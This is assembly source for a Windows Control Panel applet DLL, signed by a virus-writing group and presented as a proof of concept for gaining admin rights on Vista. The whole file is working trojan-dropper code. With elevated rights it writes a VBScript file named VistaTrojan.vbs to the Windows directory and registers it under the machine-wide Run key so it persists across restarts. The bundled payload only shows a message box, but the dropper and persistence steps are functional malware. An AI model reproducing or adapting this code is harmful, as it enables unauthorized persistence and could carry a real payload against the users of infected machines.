.486
.model flat,stdcall
option casemap :none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include  \masm32\include\advapi32.inc

includelib \masm32\lib\kernel32.lib
includelib  \masm32\lib\advapi32.lib

.data
InternalMsG db "Coded by [WarGame/doomriderz]",0 ; never displayed 
Nm db "\VistaTrojan.vbs",0
Trojan db MAX_PATH dup (0)
exkey HKEY 0
AutoPath db "SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0
AutoKey db "VistaTrojan",0
TrojanCode db "msgbox ",34,"This is a simple PoC showing you how to get admin rights!",34,",,",34,"Coded by [WarGame/doomriderz]",34,0
WrittenBytes dw 0

.code

; this should be the default dll entry point ... but it is useless for us
LibMain proc hInstDLL:DWORD, reason:DWORD, unused:DWORD
LibMain endp

; the following code will have admin rights
CPIApplet proc hwndCPl:DWORD,uMsg:DWORD,lParam1:DWORd,lParam2:DWORD

          ; drop the trojan in the windows directory
          invoke GetWindowsDirectory,addr Trojan,MAX_PATH
          invoke lstrcat,addr Trojan,addr Nm

          ; write it
          invoke CreateFile,addr Trojan,GENERIC_WRITE,FILE_SHARE_WRITE,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
          .if eax == INVALID_HANDLE_VALUE
              invoke ExitProcess,0
          .endif
          xchg ebx,eax
          invoke lstrlen,addr TrojanCode
          xchg edx,eax
          invoke WriteFile,ebx,addr TrojanCode,edx,addr WrittenBytes,0
          invoke CloseHandle,ebx

          ; add it to autostart
          invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,addr AutoPath,0,KEY_WRITE,addr exkey
          .if eax != ERROR_SUCCESS
              invoke ExitProcess,0
          .endif
          invoke lstrlen,addr Trojan
          xchg ecx,eax
          invoke RegSetValueEx,exkey,addr AutoKey,0,REG_SZ,addr Trojan,ecx
          invoke RegCloseKey,exkey
          ret

CPIApplet endp

end LibMain